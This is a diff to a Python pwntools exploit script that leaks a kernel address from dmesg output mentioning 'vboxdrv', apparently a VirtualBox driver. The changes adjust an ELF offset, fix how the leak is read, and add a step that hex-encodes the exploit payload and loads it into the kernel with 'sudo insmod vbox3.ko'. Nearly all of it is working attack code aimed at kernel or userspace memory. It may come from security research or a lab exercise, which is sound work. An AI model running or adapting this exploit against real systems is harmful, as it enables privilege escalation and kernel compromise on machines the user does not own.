@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3.5
 import sys
 from pwn import *
 context.clear(arch='amd64', kernel='amd64')
@@ -55,13 +55,14 @@ class Adjuster(object):
 
     def __call__(self, addr):
         return self.offset + addr
-adjuster = Adjuster(0x40)
+adjuster = Adjuster(0x00)
 
 
 def leaked(start_leaker, search_for):
     # Get the address from the leak
     leaker = process(start_leaker)
-    leak = [l for l in leaker.recv().decode('utf-8').replace('\r', '').split('\n') if 'vboxdrv:' in l and search_for in l]
+    leak = leaker.recvall().decode('utf-8').replace('\r', '')
+    leak = [l for l in leak.split('\n') if 'vboxdrv:' in l and search_for in l]
     if len(leak) < 1:
         return
     leak = leak[-1].split()
@@ -154,6 +155,10 @@ def create_exploit(target_binary, payload_file, leak):
     return exploit
 
 def attack_userspace(target_binary, payload_file):
+    # For ELF offset
+    global adjuster
+    adjuster = Adjuster(0x40)
+
     leak, leaker = leaked(['./userspace', target_binary, payload_file],
             target_binary)
     print('Leaked address is', str(hex(leak)))
@@ -162,10 +167,17 @@ def attack_userspace(target_binary, payload_file):
     leaker.shutdown()
 
 def attack_kernel(target_binary, payload_file):
-    leak, leaker = leaked(['dmesg'], target_binary)
+    leak, leaker = leaked(['dmesg', '--color=never'], target_binary)
     leaker.shutdown()
     print('Leaked address is', str(hex(leak)))
     exploit = create_exploit(target_binary, payload_file, leak)
+    exploit = bytes(exploit).hex()
+    n = 2
+    exploit = ','.join([exploit[i:i+n] for i in range(0, len(exploit), n)])
+    args = ['sudo', 'insmod', 'vbox3.ko', 'exploit_payload="'+exploit+'"',
+        'exploit_length="'+str(len(exploit))+'"']
+    print(args)
+    process(args)
 
 def main():
     # Make sure we have enough args
